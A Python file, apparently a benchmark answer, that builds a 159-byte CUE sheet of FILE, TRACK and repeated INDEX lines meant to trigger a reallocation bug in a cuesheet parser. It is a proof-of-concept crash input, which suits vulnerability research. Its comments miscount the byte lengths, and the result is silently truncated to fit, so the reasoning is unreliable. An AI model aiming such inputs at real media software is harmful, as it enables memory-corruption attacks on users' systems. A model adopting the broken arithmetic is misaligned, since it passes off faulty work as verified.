import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Cuesheet header with FILE command
        header = b'FILE "dummy.wav" WAVE\n'
        
        # TRACK command
        track = b'  TRACK 01 AUDIO\n'
        
        # Build cuesheet with multiple INDEX commands
        # Using exact ground-truth length of 159 bytes
        cuesheet = header + track
        
        # Add INDEX commands - each is exactly formatted to trigger reallocation
        # Each INDEX line: "    INDEX 00 00:00:00" = 22 bytes including newline
        # We need (159 - len(header+track)) / 22 = (159-38)/22 = 5.5
        # Actually 38 + 5*22 = 148, need 11 more bytes
        # Add another INDEX with shorter time format
        
        for i in range(5):
            index = f'    INDEX {i+1:02d} 00:00:00\n'.encode('ascii')
            cuesheet += index
        
        # Add final INDEX with adjusted format to reach exactly 159 bytes
        cuesheet += b'    INDEX 06 00:00\n'
        
        # Verify length
        if len(cuesheet) != 159:
            # Adjust if needed (shouldn't happen with this construction)
            cuesheet = cuesheet[:159].ljust(159, b' ')
        
        return cuesheet